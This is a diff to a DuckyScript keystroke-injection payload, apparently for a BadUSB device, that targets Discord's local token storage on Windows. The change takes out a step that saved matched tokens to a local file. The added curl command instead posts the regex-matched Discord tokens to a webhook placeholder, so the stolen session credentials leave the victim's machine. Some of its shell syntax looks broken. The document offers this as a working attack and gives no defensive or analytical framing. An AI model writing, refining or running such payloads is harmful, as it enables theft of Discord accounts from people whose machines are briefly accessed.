@@ -4,20 +4,7 @@ DELAY 100
 STRING cmd /c "echo %APPDATA%\discord\Local Storage\leveldb\ > filepath.txt"
 ENTER
 DELAY 100
-GUI r
-DELAY 100
-STRING notepad
-ENTER
-DELAY 100
-STRING discord_tokens.txt
-ENTER
-DELAY 100
-STRING for /R %content% %%f in (discord_token*) do (
-STRING     findstr /R "[a-zA-Z0-9_\.-]*\.[a-zA-Z0-9_\.-]*\.[a-zA-Z0-9_\.-]*" %%f >> discord_tokens.txt
-STRING )
-ENTER
-DELAY 100
-STRING exit
+STRING curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"Tokens: $(for /R %content% %%f in (discord_token*) do (findstr /R \"[a-zA-Z0-9_\.-]*\.[a-zA-Z0-9_\.-]*\.[a-zA-Z0-9_\.-]*\" %%f))\"}" (WEBHOOK-URL-HERE)
 ENTER
 DELAY 100
 GUI r
